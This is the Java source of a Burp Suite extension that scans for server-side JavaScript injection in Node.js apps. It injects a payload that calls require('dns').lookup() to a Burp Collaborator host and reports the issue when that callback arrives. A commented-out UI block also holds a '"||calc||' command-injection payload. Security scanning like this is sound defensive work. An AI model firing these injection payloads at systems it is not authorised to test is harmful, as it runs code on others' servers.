package burp;

import burp.about;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import java.net.URL;
import javax.swing.*;

public class BurpExtender implements IBurpExtender, ITab, IScannerCheck {
    
    Boolean isDebugging = false;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    private PrintWriter mStdOut;
    private PrintWriter mStdErr;
   
    // GUI
    private JTabbedPane topTabs;

    //
    // implement IBurpExtender
    //
    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;

        this.helpers = callbacks.getHelpers();

        this.mStdOut = new PrintWriter(callbacks.getStdout(), true);
        this.mStdErr = new PrintWriter(callbacks.getStderr(), true);

        callbacks.setExtensionName("NodeJS Server Side JavaScript Injection Scanner");

        // register ourselves as a custom scanner check
        callbacks.registerScannerCheck(this);

        // GUI
        /**
         * SwingUtilities.invokeLater(new Runnable() {
         *
         * @Override public void run() { topTabs = new JTabbedPane(); JPanel
         * parametersPanel = new JPanel(); JPanel payloadsPanel = new JPanel();
         * JPanel aboutPanel = new JPanel();
         * parametersTextArea.setText("callback\njsonpcallback\njsonp\ncb\njcb");
         * payloadsTextArea.setText("\"||calc||"); topTabs.addTab("RFD
         * Parameters", parametersPanel); topTabs.addTab("RFD Payloads",
         * payloadsPanel); burp.about.initializeFunction(topTabs);
         * parametersPanel.add(new JLabel("Parameters:"));
         * parametersPanel.add(parametersTextArea); JButton
         * clearButtonForParameters = new JButton("Clear");
         * parametersPanel.add(clearButtonForParameters);
         * clearButtonForParameters.addActionListener(new ActionListener() {
         * @Override public void actionPerformed(ActionEvent ae) {
         * parametersTextArea.setText(""); } }); payloadsPanel.add(new
         * JLabel("Payloads:")); payloadsPanel.add(payloadsTextArea); JButton
         * clearButtonForPayloads = new JButton("Clear");
         * payloadsPanel.add(clearButtonForPayloads);
         * clearButtonForPayloads.addActionListener(new ActionListener() {
         * @Override public void actionPerformed(ActionEvent ae) {
         * payloadsTextArea.setText(""); } }); // customize our UI components
         * //callbacks.customizeUiComponent(topTabs); // disabled to be able to
         * drag and drop columns // add the custom tab to Burp's UI
         * callbacks.addSuiteTab(BurpExtender.this); }
        });*
         */
    }

    @Override
    public String getTabCaption() {
        return "NodeJS SSJI";
    }

    @Override
    public Component getUiComponent() {
        return topTabs;
    }

    // helper method to search a response for occurrences of a literal match string
    // and return a list of start/end offsets
    private List<int[]> getMatches(byte[] response, byte[] match) {
        List<int[]> matches = new ArrayList<int[]>();

        int start = 0;
        while (start < response.length) {
            start = helpers.indexOf(response, match, true, start, response.length);
            if (start == -1) {
                break;
            }
            matches.add(new int[]{start, start + match.length});
            start += match.length;
        }

        return matches;
    }
    
    //
    // implement IScannerCheck
    //
    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
            IScannerInsertionPoint insertionPoint) {
        IBurpCollaboratorClientContext ccc = callbacks.createBurpCollaboratorClientContext();
        String host = ccc.generatePayload(true);
        String payload = ";const dns=require('dns');dns.lookup('" + host + "',(err,address,family)=>{});";
        byte[] checkRequest = insertionPoint.buildRequest(helpers.stringToBytes(payload));
        IHttpRequestResponse checkRequestResponse = this.callbacks.makeHttpRequest(baseRequestResponse
                .getHttpService(), checkRequest);
       
        
        List<IBurpCollaboratorInteraction> events = ccc.fetchCollaboratorInteractionsFor(host);
        if (!events.isEmpty()) {

            List<IScanIssue> issues = new ArrayList<>();
            issues.add(new burp.CustomIssue(
                    checkRequestResponse.getHttpService(),
                    this.callbacks.getHelpers().analyzeRequest(checkRequestResponse).getUrl(),
                    checkRequestResponse,
                    "NodeJS Server Side JavaScript Injection",
                    "By using " + payload + " Server Side JavaScript Injection is triggered<br>"
                     +"Host used in Burp Collaborator is " + host + "<br>",
                    "High",
                    "Certain")
            );
            return issues;
        } else {
            return null;
        }

    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        // This method is called when multiple issues are reported for the same URL 
        // path by the same extension-provided check. The value we return from this 
        // method determines how/whether Burp consolidates the multiple issues
        // to prevent duplication
        //
        // Since the issue name is sufficient to identify our issues as different,
        // if both issues have the same name, only report the existing issue
        // otherwise report both issues
        if (existingIssue.getIssueName().equals(newIssue.getIssueName())) {
            return -1;
        } else {
            return 0;
        }
    }
}
